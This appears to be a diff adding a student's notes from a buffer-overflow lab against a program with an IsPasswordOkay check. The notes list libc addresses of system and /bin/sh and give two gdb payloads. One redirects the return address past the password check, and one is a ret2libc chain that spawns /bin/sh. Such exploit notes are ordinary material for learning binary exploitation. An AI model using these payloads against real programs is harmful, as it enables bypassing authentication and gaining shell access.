@@ -1,0 +1,20 @@
+AAAAAAAAAAAA
+0x7ffff7dff3d0 - addr of system
+0x7ffff7f4e031 - addr of /bin/sh
+
+32 bit
+0xf7c49840 - addr of system
+0xf7dbafaa - addr of /bin/sh
+
+
+correct return addr
+r $(python -c '__import__("sys").stdout.buffer.write(b"\x41"*16+b"\xf4\x8f\x55\x56"+b"\x18\xcc\xff\xff"+b"\x82\x62\x55\x56")')
+
+r $(python -c '__import__("sys").stdout.buffer.write(b"\x41"*16+b"\xf4\x8f\x55\x56"+b"\x18\xcc\xff\xff"+b"\x40\x98\xc4\xf7"+b"\x41"*4+b"\xaa\xaf\xdb\xf7")')
+
+
+q1
+0x5655628f - addr to jump to on return from IsPasswordOkay
+0x565562ac
+ebx - 0x56558ff4
+ebp - 0xffffcc08
